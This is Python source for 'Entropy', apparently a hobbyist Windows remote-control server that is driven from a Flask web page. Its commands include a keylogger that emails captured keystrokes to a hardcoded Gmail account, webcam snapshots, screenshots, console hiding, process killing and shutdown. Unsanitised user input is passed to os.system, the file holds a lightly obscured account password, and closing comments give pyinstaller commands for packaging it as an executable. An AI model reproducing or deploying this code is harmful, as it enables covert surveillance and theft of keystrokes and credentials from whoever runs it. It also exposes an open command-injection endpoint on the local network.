from flask import Flask, request, render_template
import os
import time
import socket
import subprocess
import psutil
from subprocess import call
import smtplib
import webbrowser as web
import osi
import cv2
import pyqrcode
import png
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import voice
import vol
from flask import send_file
import pyautogui as pag
from tkinter import Tk, Label, Entry, Button
import vact
from pynput.keyboard import Listener
import threading
import win32gui
import win32con
#hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(hide , win32con.SW_HIDE)
# encryption-----------------------------------------------


def encryp(method, message):
    dack = "123ABCDEFGHIJ4567890KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz~!@#$%^&*()_-+=[];',|:<>."
    nack = "<IemS)_9^DxXd6Z3|fVp8aF&2'~-5$k[QWP(*w?,>%KqCilOYT]MsJ!:u=tGvRoH4ghj+10U@zcAbE;7nrLy#NB"
    if(method == "enc"):
        l = dack
        r = nack
    elif(method == "dec"):
        l = nack
        r = dack
    k = " "
    hue = []
    poki = []
    pin = message
    # pin=
    hue = pin.split(" ")
    for z in range(0, len(hue)):
        tin = hue[z]
        thr = ""
        for i in range(0, len(tin)):
            for j in range(0, len(l)):
                if (l[j] == tin[i]):
                    thr = thr+r[j]
                if (l[j] == " "):
                    pass
        poki.append(thr)
    lomin = k.join(poki)
    return lomin

# getting system ip------------------------------------------


hostname = socket. gethostname()
oi = socket. gethostbyname(hostname)
oi = str(oi)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
pic = s.getsockname()[0]
s.close()

local_ip = pic

# creating Qr code------------------------------------------
s = "http://%s:5000/" % local_ip
url = pyqrcode.create(s)
url.png("qrcode.png", scale=6)
# ----------------------------------------------------------
nb = """<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing: 0; border-collapse: collapse; mso-table-lspace:0pt; mso-table-rspace:0pt;"><tr><td style="padding-top: 10px; padding-right: 10px; padding-bottom: 10px; padding-left: 10px" align="center"><v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word" href="http://"""+s+"""/" style="height:24pt; width:96.75pt; v-text-anchor:middle;" arcsize="13%" stroke="false" fillcolor="#f9f9f9"><w:anchorlock/><v:textbox inset="0,0,0,0"><center style="color:#0fa2a2; font-family:Arial, sans-serif; font-size:16px"><![endif]--><a href='"""+s + \
    """' style="-webkit-text-size-adjust: none; text-decoration: none; display: inline-block; color: #0fa2a2; background-color: #f9f9f9; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; width: auto; width: auto; border-top: 0px solid #FFFFFF; border-right: 0px solid #FFFFFF; border-bottom: 0px solid #FFFFFF; border-left: 0px solid #FFFFFF; padding-top: 0px; padding-bottom: 0px; font-family: Arial, Helvetica Neue, Helvetica, sans-serif; text-align: center; mso-border-alt: none; word-break: keep-all;" target="_blank"><span style="padding-left:20px;padding-right:20px;font-size:16px;display:inline-block;letter-spacing:undefined;"><span style="font-size: 16px; line-height: 2; word-break: break-word; mso-line-height-alt: 32px;"><strong>Go</strong></span></span></a>\n"""
joke = open(r"templates\email.html", "r")
toi = joke.readlines()
joke.close()
fand = open(r"templates\email.html", "w")
for i in range(0, len(toi)):
    if(i == 192):
        fand.write(nb)
    else:
        fand.write(toi[i])
fand.close()
#print(encryp("enc", "efxxiigvzwvoxzve"),"----------")
# email-----------------------------------------
email = "entropytesting1@gmail.com"
email2 = ""
password = r">%GGCCK=Rt=]GR=>"
s = "server address: "+s
# print(s)
server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
msg = MIMEMultipart()
msg['Subject'] = 'Server started on %s' % hostname
msg['From'] = '%s' % email
msg['To'] = '%s' % email2
img_data = open("qrcode.png", 'rb').read()
html = open(r"templates\email.html")
cool = MIMEText(html.read(), 'html')
msg.attach(cool)
#print(encryp("dec", password))
password = encryp("dec", password)
should = 9
bingola = 100
try:
    def terms():
        if(9 == 9):
            v = open("sys.dat", "w")
            win = Tk()
            win. title("terms and conditions")

            def search():
                email2 = entry.get()
                if(email2 == "yes"):
                    bingola = 1
                    v.write("User agreed to  terms and conditions!\n")
                    teamer = "yes"
                elif(email2 == "no"):
                    bingola = 0
                    v.write("User didn't agreed to  terms and conditions!\n")
                    teamer = "no"
                else:
                    terms()
                v.close()
                win.destroy()

            label1 = Label(win, text="""I as a user of entropy agree to not using it for wrong purposes!
            
            Type [yes] if u agree or [no] if u don't agree to our terms and conditions""", font=("arial", 10, "bold"))
            label1. grid(row=0, column=0)
            entry = Entry(win, width=30)

            entry . grid(row=0, column=0)
            button = Button(win, text="Submit", command=search)
            button. grid(row=1, column=0, columnspan=2, pady=10)
            win. mainloop()
        else:
            pass

    def emailget():
        if(0 == 0):
            if(9 == 9):
                v = open("sys.dat", "a")
                win = Tk()
                win. title("email_id")

                def search():
                    email2 = entry.get()
                    v.write(encryp("enc", email2))
                    v.close()
                    win.destroy()
                label1 = Label(win, text="Enter your email_id:   ",
                               font=("arial", 10, "bold"))
                label1. grid(row=0, column=0)
                entry = Entry(win, width=30)

                entry . grid(row=0, column=1)
                button = Button(win, text="Search", command=search)
                button. grid(row=1, column=0, columnspan=2, pady=10)
                win. mainloop()
                v = open("sys.dat", "r")
                fg = v.readlines()
                email2 = encryp("dec", fg[1])
                v.close()
                server.login(email, password)
                server.sendmail(email, email2, msg.as_string())
                server.quit()
                should = 1
    path = os.listdir()
    if("sys.dat" not in path):
        terms()
        v = open("sys.dat", "r")
        fg = v.readlines()
        tvy = fg[0]
        v.close()
        if("User agreed to  terms and conditions!" in tvy):
            emailget()
        else:
            pass
    else:
        v = open("sys.dat", "r")
        fg = v.readlines()
        if("User agreed to  terms and conditions!" in fg[0]):
            bingola = 1
            email2 = encryp("dec", fg[1])
            server.login(email, password)
            server.sendmail(email, email2, msg.as_string())
            server.quit()
            should = 1
        elif("User didn't agreed to  terms and conditions!" in fg[0]):
            bingola = 0
            print("")
            print("------------------------------------------------------------------------------------------------")
            print("|sorry we can't provide our services to you, because you don't agree to our terms and conditions|")
            print("------------------------------------------------------------------------------------------------")
            print("")
            bae = input("Would you like to restart Entropy setup? y/n: ")
            if(bae == "y"):

                terms()
                v = open("sys.dat", "r")
                fg = v.readlines()
                tvy = fg[0]
                v.close()
                if("User agreed to  terms and conditions!" in tvy):
                    emailget()
                else:
                    pass
            else:
                pass
        else:
            print("error")
except smtplib.SMTPAuthenticationError:
    should = 0
    print("Your need to allow access to less secure apps to run this app\n")
    print("Here is the place where you can enable this on for your gmail account\n")
    web.open("https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4P2BaEeCSBh4eyEVAS2XEvjoKPZwnWhrXhQmjveo2zigLVzHrPWRwC8cs2PetuDpX7KaYmPxrvLySfQDA0BdP6-UjJmCg")
except Exception:
    should = 0
    print("We are facing problem sending the website link to your gmail, here is the qr code to the website\n")
    os.startfile("qrcode.png")
    print("Thankyou, your server is running now")


# key loger------------------------------------------------------------
if(bingola == 1):
    def logger(times):
        def sendemail():
            horse = open("log.dat", "r")
            fry = horse.readlines()
            horse.close()
            pantt = open("log.dat", "w")
            pantt.close()
            oggy = "".join(fry)
            if(should == 1):
                try:
                    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                    msg = MIMEMultipart()
                    msg['Subject'] = 'key log from %s computer' % hostname
                    msg['From'] = '%s' % email
                    msg['To'] = '%s' % email2
                    text = MIMEText(oggy)
                    msg.attach(text)
                    server.login(email, password)
                    server.sendmail(email, email2, msg.as_string())
                    server.quit()
                except Exception:
                    pass
            else:
                pass

        def log_keystroke(key):
            key = str(key)
            print("--", key)
            key = key.replace("'", "")
            if (key == 'Key.space'):
                key = ' '
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif (key == 'Key.tab'):
                key = '\t'
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif (key == r'\x03'):
                key = '[COPY]'
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif (key == r'\x16'):
                key = '[PASTE]'
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif ('Key.shift' in key):
                key = '[SHIFT]'
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif (key == "Key.enter"):
                key = '\n'
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif ("Key.ctrl" in key):
                key = '[CTRL]'
                print(key)
                car = open("log.dat", 'a')
                car.write(key)
                car.close()
            elif (key == "Key.backspace"):
                print(key)
                car = open("log.dat", "r")
                punk = car.readlines()
                car.close()
                car = open("log.dat", "w")
                for i in range(0, len(punk)):
                    yuki = punk[i]
                    if(i == len(punk)-1):
                        car.write(yuki[0:-1])
                        break
                    else:
                        car.write(yuki)
                car.close()
            else:
                with open("log.dat", 'a') as f:
                    if("Key." not in key):
                        print(key)
                        f.write(key)
                    else:
                        pass

        def run():
            with Listener(on_press=log_keystroke) as l:
                def time_out(period_sec):
                    period_sec = period_sec*60
                    # Listen to keyboard for period_sec seconds
                    time.sleep(period_sec)
                    l.stop()
                threading.Thread(target=time_out, args=(times,)).start()
                l.join()
            print("sending email")
            sendemail()
            print("clearing log.dat")
            kami = open("log.dat", 'w')
            kami.close()
            print("done now")

        print("starting the keylogger thread")
        keylog = threading.Thread(target=run)
        keylog.start()   

    # app closer--------------------------------------------------------------------------

    def close(fname):
        output = subprocess.check_output(('TASKLIST', '/FO', 'CSV')).decode()
        # get rid of extra " and split into lines
        pro = []
        output = output.replace('"', '').split('\r\n')
        keys = output[0].split(',')
        proc_list = [i.split(',') for i in output[1:] if i]
        # make dict with proc names as keys and dicts with the extra fo as values
        proc_dict = dict((i[0], dict(zip(keys[1:], i[1:]))) for i in proc_list)
        for name, values in sorted(proc_dict.items(), key=lambda x: x[0].lower()):
            pro.append(name)
        p = len(pro)
        for i in range(0, p):
            name = pro[i]
            k = name.lower()
            if (fname in k):
                print(name)
                #gh = len(name)
                he = name.replace(".exe", "")
                print(he)
                os.system("TASKKILL /F /IM %s.exe" % he)
            else:
                pass

    # volume-----------------------
    def volume(name, no):
        vol.v(name, no)
    # server starter-------------------------------------------------------------------------
    app = Flask(__name__)
    @app.route('/')
    def my_form():
        return render_template('my-form.html')
    @app.route('/download')
    def download():
        return render_template('download.html')
    @app.route('/functions')
    def functions():
        return render_template('functions.html')
    @app.route('/about')
    def about():
        return render_template('about.html')
    @app.route('/', methods=['POST'])
    def my_form_post():
        text = request.form['text']
        text = text.lower()
        if(osi.conditioner(1, text, "!close current", 2) == "true"):
            pag.keyDown("alt")
            pag.keyDown("f4")
            pag.keyUp("f4")
            pag.keyUp("alt")
            processed_text = "current window closed on %s" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!close", 1) == "true"):
            text = text.replace("!close ", "")
            close(text)
            processed_text = text.upper()+" app closed on %s!" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!say male", 2) == "true"):
            #noki="no such command!"
            # return noki
            text = text.replace("!say male ", "")
            voice.out("%s" % text, 0, 170)
            processed_text = "Saying '"+text+"' in male voice on %s computer" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!say female", 2) == "true"):
            #noki="no such command!"
            # return noki
            text = text.replace("!say female ", "")
            voice.out("%s" % text, 1, 170)
            processed_text = "Saying '"+text+"' in female voice on %s computer" % hostname
            return processed_text
        
        elif (osi.conditioner(1, text, "!picture", 1) == "true"):
            videoCaptureObject = cv2.VideoCapture(0)
            result = True
            while(result):
                ret, frame = videoCaptureObject.read()
                cv2.imwrite("pic.png", frame)
                result = False
            videoCaptureObject.release()
            cv2.destroyAllWindows()
            processed_text = "pic.png"
            return send_file(processed_text, mimetype='image/gif')

        elif (osi.conditioner(1, text, "!vl", 1) == "true"):
            text = text.replace("!vl ", "")
            print(text)
            volume(text, 0.2)
            # vol.v("%s"%text,0.2)
            processed_text = text+" app volume set to low on %s computer" % hostname
            return processed_text
        elif (osi.conditioner(1, text, "!vm", 1) == "true"):
            text = text.replace("!vm ", "")
            vol.v("%s" % text, 0.5)
            processed_text = text+"' app volume set to medium on %s computer" % hostname
            return processed_text
        
        elif (osi.conditioner(1, text, "!vf", 1) == "true"):
            text = text.replace("!vf ", "")
            vol.v("%s" % text, 1)
            processed_text = text+"' app volume set to full on %s computer" % hostname
            return processed_text
        elif (osi.conditioner(1, text, "!vr", 1) == "true"):
            print("reset")
            vol.v("all", 1)
            processed_text = "volume reset on %s computer!" % hostname
            return processed_text
        elif (osi.conditioner(1, text, "!mute", 1) == "true"):
            text = text.replace("!mute ", "")
            vol.v("%s" % text, 0)
            processed_text = "'"+text+"' muted! on %s computer!" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!battery", 1) == "true"):
            battery = psutil.sensors_battery()
            print(battery)
            processed_text=battery[0]
            processed_text=str(processed_text)
            return processed_text
        elif (osi.conditioner(1, text, "!s", 1) == "true"):
            text = text.replace("!s ", "")
            web.open("https://www.google.com/search?q=%s" % text)
            processed_text = "searched '"+text+"' on %s computer!" % hostname
            return processed_text
        elif (osi.conditioner(1, text, "!unmute", 1) == "true"):
            text = text.replace("!unmute ", "")
            vol.v("%s" % text, 1)
            processed_text = "'"+text+"' unmuted! on %s computer!" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!lock", 1) == "true"):
            cmd = 'rundll32.exe user32.dll, LockWorkStation'
            subprocess.call(cmd)
            processed_text = "%s computer is locked now!" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!play", 1) == "true"):
            pag.hotkey('playpause')
            processed_text = "Media playing on %s" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!pause", 1) == "true"):
            pag.hotkey('playpause')
            processed_text = "Media paused on %s" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!write", 1) == "true"):
            text = text.replace("!write ", "")
            pag.write('%s' % text)
            processed_text = "Typed '%s' on %s" % (text, hostname)
            return processed_text
        elif(osi.conditioner(1, text, "!sleep", 1) == "true"):
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            processed_text = """%s computer going to sleep. 
                                Thankyou for using Entropy!
                                                                            
                                                                            powered by: LominCorp""" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!restart", 1) == "true"):
            subprocess.call(["shutdown", "/r"])
            processed_text = """Restarting %s computer. 
                                Thankyou for using Entropy!
                                                                            
                                                                            powered by: LominCorp""" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!shutdown", 1) == "true"):
            subprocess.call(["shutdown", "/s"])
            processed_text = """shutting down %s. 
                                Thankyou for using Entropy!
                                                                            
                                                                            powered by: LominCorp""" % hostname
            return processed_text
        elif(osi.conditioner(1, text, "!fix", 1) == "true"):
            call('taskkill /IM explorer.exe /F', shell=True)
            time.sleep(2)
            call(["start", "explorer.exe"], shell=True)
            processed_text = "opened '%s' on %s" % (text, hostname)
            return processed_text
        elif(osi.conditioner(1, text, "!open", 1) == "true"):
            text = text.replace("!open ", "")
            try:
                os.system('start %s:' % text)
            except Exception:
                os.system('start %s' % text)
            processed_text = "opened '%s' on %s" % (text, hostname)
            return processed_text
        elif(osi.conditioner(1, text, "!start", 1) == "true"):
            text = text.replace("!start ", "")
            try:
                os.system('start %s:' % text)
            except Exception:
                os.system('start %s' % text)
            processed_text = "opened '%s' on %s" % (text, hostname)
            return processed_text
        elif(osi.conditioner(1, text, "!keylogger", 1) == "true"):
            text = text.replace("!keylogger ", "")
            try:
                text = int(text)
                s = str(text)
                processed_text = "Keylogger initiated on %s, logging keys for %s minutes" % (
                    hostname, s)
                t = threading.Thread(target=logger, args=(text,))
                t.start()
                return processed_text
            except Exception:
                processed_text = "Keylogger initiated on %s, you will get the logs on your email in 1 minute" % hostname
                t = threading.Thread(target=logger, args=(1,))
                t.start()
                return processed_text
        elif(osi.conditioner(1, text, "!hide", 1) == "true"):
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide, win32con.SW_HIDE)
            processed_text = "Console hidden on %s, you will have to restart %s to shutdown the server!" % (
                hostname, hostname)
            return processed_text

        elif(osi.conditioner(1, text, "!link", 1) == "true"):
            text = text.replace("!link ", "")
            web.open("%s" % text)
            processed_text = "DONE!"
            return processed_text

        elif(osi.conditioner(1, text, "!commands", 1) == "true"):
            processed_text = r"templates\commands.png"
            return send_file(processed_text, mimetype='image/gif')
        
        #elif(osi.conditioner(1, text, "!camera", 1) == "true"):
        #    camera.takepic()
        #    processed_text = "pic.png"
        #    return send_file(processed_text, mimetype='image/gif')
            
        elif(osi.conditioner(1, text, "!screenshot", 1) == "true"):
            p = os. getcwd()
            if(9 == 0):
                try:
                    myScreenshot = pag.screenshot()
                    myScreenshot.save(r"%s/templates/screenshot.png" % p)
                    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                    msg = MIMEMultipart()
                    msg['Subject'] = 'Screenshot taken on %s' % hostname
                    msg['From'] = '%s' % email
                    msg['To'] = '%s' % email2
                    img_data = open("screenshot.png", 'rb').read()
                    image = MIMEImage(
                        img_data, name=os.path.basename("screenshot.png"))
                    msg.attach(image)
                    server.login(email, password)
                    server.sendmail(email, email2, msg.as_string())
                    server.quit()
                    processed_text = "Screenshot sent on your email!"
                    return processed_text
                except Exception:
                    processed_text = "Screenshot saved in the folder where the server is running!"
                    return processed_text
            elif("k" == "k"):
                myScreenshot = pag.screenshot()
                myScreenshot.save(r"%s/templates/screenshot.png" % p)
                processed_text = "templates\screenshot.png"
                return send_file(processed_text, mimetype='image/gif')
            else:
                myScreenshot = pag.screenshot()
                myScreenshot.save(r"%s/screenshot.png" % p)
                processed_text = "Screenshot saved in root directory!"
                return processed_text

        else:
            processed_text = "'"+text+"' Unknown command!"
            return processed_text
    @app.route('/functions', methods=['POST'])
    def function_post():
            text = request.form['text']
            text = text.lower()
            if(osi.conditioner(1, text, "!close current", 2) == "true"):
                pag.keyDown("alt")
                pag.keyDown("f4")
                pag.keyUp("f4")
                pag.keyUp("alt")
                processed_text = "current window closed on %s" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!close", 1) == "true"):
                text = text.replace("!close ", "")
                close(text)
                processed_text = text.upper()+" app closed on %s!" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!say male", 2) == "true"):
                #noki="no such command!"
                # return noki
                text = text.replace("!say male ", "")
                voice.out("%s" % text, 0, 170)
                processed_text = "Saying '"+text+"' in male voice on %s computer" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!say female", 2) == "true"):
                #noki="no such command!"
                # return noki
                text = text.replace("!say female ", "")
                voice.out("%s" % text, 1, 170)
                processed_text = "Saying '"+text+"' in female voice on %s computer" % hostname
                return processed_text
            
            elif (osi.conditioner(1, text, "!picture", 1) == "true"):
                videoCaptureObject = cv2.VideoCapture(0)
                result = True
                while(result):
                    ret, frame = videoCaptureObject.read()
                    cv2.imwrite("pic.png", frame)
                    result = False
                videoCaptureObject.release()
                cv2.destroyAllWindows()
                processed_text = "pic.png"
                return send_file(processed_text, mimetype='image/gif')

            elif (osi.conditioner(1, text, "!vl", 1) == "true"):
                text = text.replace("!vl ", "")
                print(text)
                volume(text, 0.2)
                # vol.v("%s"%text,0.2)
                processed_text = text+" app volume set to low on %s computer" % hostname
                return processed_text
            elif (osi.conditioner(1, text, "!vm", 1) == "true"):
                text = text.replace("!vm ", "")
                vol.v("%s" % text, 0.5)
                processed_text = text+"' app volume set to medium on %s computer" % hostname
                return processed_text
            
            elif (osi.conditioner(1, text, "!vf", 1) == "true"):
                text = text.replace("!vf ", "")
                vol.v("%s" % text, 1)
                processed_text = text+"' app volume set to full on %s computer" % hostname
                return processed_text
            elif (osi.conditioner(1, text, "!vr", 1) == "true"):
                print("reset")
                vol.v("all", 1)
                processed_text = "volume reset on %s computer!" % hostname
                return processed_text
            elif (osi.conditioner(1, text, "!mute", 1) == "true"):
                text = text.replace("!mute ", "")
                vol.v("%s" % text, 0)
                processed_text = "'"+text+"' muted! on %s computer!" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!battery", 1) == "true"):
                battery = psutil.sensors_battery()
                print(battery)
                processed_text=battery[0]
                processed_text=str(processed_text)
                return processed_text
            elif (osi.conditioner(1, text, "!s", 1) == "true"):
                text = text.replace("!s ", "")
                web.open("https://www.google.com/search?q=%s" % text)
                processed_text = "searched '"+text+"' on %s computer!" % hostname
                return processed_text
            elif (osi.conditioner(1, text, "!unmute", 1) == "true"):
                text = text.replace("!unmute ", "")
                vol.v("%s" % text, 1)
                processed_text = "'"+text+"' unmuted! on %s computer!" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!lock", 1) == "true"):
                cmd = 'rundll32.exe user32.dll, LockWorkStation'
                subprocess.call(cmd)
                processed_text = "%s computer is locked now!" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!play", 1) == "true"):
                pag.hotkey('playpause')
                processed_text = "Media playing on %s" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!pause", 1) == "true"):
                pag.hotkey('playpause')
                processed_text = "Media paused on %s" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!write", 1) == "true"):
                text = text.replace("!write ", "")
                pag.write('%s' % text)
                processed_text = "Typed '%s' on %s" % (text, hostname)
                return processed_text
            elif(osi.conditioner(1, text, "!sleep", 1) == "true"):
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                processed_text = """%s computer going to sleep. 
                                    Thankyou for using Entropy!
                                                                                
                                                                                powered by: LominCorp""" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!restart", 1) == "true"):
                subprocess.call(["shutdown", "/r"])
                processed_text = """Restarting %s computer. 
                                    Thankyou for using Entropy!
                                                                                
                                                                                powered by: LominCorp""" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!shutdown", 1) == "true"):
                subprocess.call(["shutdown", "/s"])
                processed_text = """shutting down %s. 
                                    Thankyou for using Entropy!
                                                                                
                                                                                powered by: LominCorp""" % hostname
                return processed_text
            elif(osi.conditioner(1, text, "!fix", 1) == "true"):
                call('taskkill /IM explorer.exe /F', shell=True)
                time.sleep(2)
                call(["start", "explorer.exe"], shell=True)
                processed_text = "opened '%s' on %s" % (text, hostname)
                return processed_text
            elif(osi.conditioner(1, text, "!open", 1) == "true"):
                text = text.replace("!open ", "")
                try:
                    os.system('start %s:' % text)
                except Exception:
                    os.system('start %s' % text)
                processed_text = "opened '%s' on %s" % (text, hostname)
                return processed_text
            elif(osi.conditioner(1, text, "!start", 1) == "true"):
                text = text.replace("!start ", "")
                try:
                    os.system('start %s:' % text)
                except Exception:
                    os.system('start %s' % text)
                processed_text = "opened '%s' on %s" % (text, hostname)
                return processed_text
            elif(osi.conditioner(1, text, "!keylogger", 1) == "true"):
                text = text.replace("!keylogger ", "")
                try:
                    text = int(text)
                    s = str(text)
                    processed_text = "Keylogger initiated on %s, logging keys for %s minutes" % (
                        hostname, s)
                    t = threading.Thread(target=logger, args=(text,))
                    t.start()
                    return processed_text
                except Exception:
                    processed_text = "Keylogger initiated on %s, you will get the logs on your email in 1 minute" % hostname
                    t = threading.Thread(target=logger, args=(1,))
                    t.start()
                    return processed_text
            elif(osi.conditioner(1, text, "!hide", 1) == "true"):
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)
                processed_text = "Console hidden on %s, you will have to restart %s to shutdown the server!" % (
                    hostname, hostname)
                return processed_text

            elif(osi.conditioner(1, text, "!link", 1) == "true"):
                text = text.replace("!link ", "")
                web.open("%s" % text)
                processed_text = "DONE!"
                return processed_text

            elif(osi.conditioner(1, text, "!commands", 1) == "true"):
                processed_text = r"templates\commands.png"
                return send_file(processed_text, mimetype='image/gif')
            
            #elif(osi.conditioner(1, text, "!camera", 1) == "true"):
            #    camera.takepic()
            #    processed_text = "pic.png"
            #    return send_file(processed_text, mimetype='image/gif')
                
            elif(osi.conditioner(1, text, "!screenshot", 1) == "true"):
                p = os. getcwd()
                if(9 == 0):
                    try:
                        myScreenshot = pag.screenshot()
                        myScreenshot.save(r"%s/templates/screenshot.png" % p)
                        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                        msg = MIMEMultipart()
                        msg['Subject'] = 'Screenshot taken on %s' % hostname
                        msg['From'] = '%s' % email
                        msg['To'] = '%s' % email2
                        img_data = open("screenshot.png", 'rb').read()
                        image = MIMEImage(
                            img_data, name=os.path.basename("screenshot.png"))
                        msg.attach(image)
                        server.login(email, password)
                        server.sendmail(email, email2, msg.as_string())
                        server.quit()
                        processed_text = "Screenshot sent on your email!"
                        return processed_text
                    except Exception:
                        processed_text = "Screenshot saved in the folder where the server is running!"
                        return processed_text
                elif("k" == "k"):
                    myScreenshot = pag.screenshot()
                    myScreenshot.save(r"%s/templates/screenshot.png" % p)
                    processed_text = "templates\screenshot.png"
                    return send_file(processed_text, mimetype='image/gif')
                else:
                    myScreenshot = pag.screenshot()
                    myScreenshot.save(r"%s/screenshot.png" % p)
                    processed_text = "Screenshot saved in root directory!"
                    return processed_text
            else:
                processed_text = "'"+text+"' Unknown command!"
                return processed_text
    if (__name__ == '__main__'):
        app.run(host=local_ip, port=5000)
    else:
        pass

# pyinstaller --icon "C:\Users\hacks\OneDrive\Pictures\Saved Pictures\system.ico" --onefile --console --hidden-import "pyttsx3.drivers" --hidden-import "pyttsx3" --hidden-import "pyttsx3.drivers.sapi5" testing.py

# pyinstaller --icon "C:\Users\hacks\OneDrive\Pictures\Saved Pictures\system.ico" --onefile --console testing.py

# pyinstaller --onefile --console --hidden-import "pyttsx3.drivers" --hidden-import "pyttsx3" --hidden-import "pyttsx3.drivers.sapi5" testing.py